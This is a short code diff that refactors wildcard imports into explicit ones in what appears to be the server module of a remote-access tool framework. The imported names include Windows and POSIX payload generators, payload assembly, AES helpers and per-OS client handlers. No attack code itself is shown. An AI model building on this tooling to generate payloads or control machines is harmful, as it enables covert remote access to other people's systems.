@@ -19,18 +19,17 @@ try:
     ELITE_AVAILABLE = True
 except ImportError:
     ELITE_AVAILABLE = False
-# TODO: Replace wildcard import with specific imports
-# TODO: Replace wildcard import with specific imports
-# TODO: Replace wildcard import with specific imports
-from .stitch_gen import *
-# TODO: Replace wildcard import with specific imports
-# TODO: Replace wildcard import with specific imports
-# TODO: Replace wildcard import with specific imports
-from .stitch_help import *
-# TODO: Replace wildcard import with specific imports
-# TODO: Replace wildcard import with specific imports
-# TODO: Replace wildcard import with specific imports
-from .stitch_utils import *
+# Specific imports from stitch_gen
+from .stitch_gen import win_gen_payload, posix_gen_payload, run_exe_gen, assemble_stitch
+
+# Specific imports from stitch_help
+# (stitch_help contains only usage functions, no specific imports needed)
+
+# Specific imports from stitch_utils
+from .stitch_utils import (
+    run_command, start_command, no_error, encrypt, decrypt, 
+    show_aes, add_aes, windows_client, osx_client, linux_client
+)
 
 class stitch_server(cmd.Cmd):
     inf_sock = {}
